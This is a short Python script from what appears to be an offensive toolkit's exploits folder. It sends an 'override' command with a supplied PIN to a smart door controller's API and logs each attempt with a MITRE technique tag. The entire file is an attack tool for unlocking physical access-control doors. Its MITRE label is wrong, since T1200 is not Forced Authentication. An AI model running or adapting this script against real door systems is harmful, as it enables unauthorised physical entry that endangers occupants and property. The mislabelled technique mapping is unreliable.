# modules/exploits/door_controller_override.py

import argparse
import requests
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1200"  # Forced Authentication

def log_door_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_override(endpoint, pin):
    payload = {"command": "override", "access_code": pin}
    try:
        res = requests.post(endpoint, json=payload, timeout=3)
        if res.ok:
            print(f"[âœ“] Door override sent to {endpoint}")
        else:
            print(f"[!] Failed: {res.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")

    log_door_event({
        "timestamp": datetime.utcnow().isoformat(),
        "endpoint": endpoint,
        "pin_used": pin,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Override Smart Door Controller")
    parser.add_argument("--endpoint", required=True, help="API endpoint of the door controller")
    parser.add_argument("--pin", required=True, help="Access PIN or override code")
    args = parser.parse_args()

    send_override(args.endpoint, args.pin)
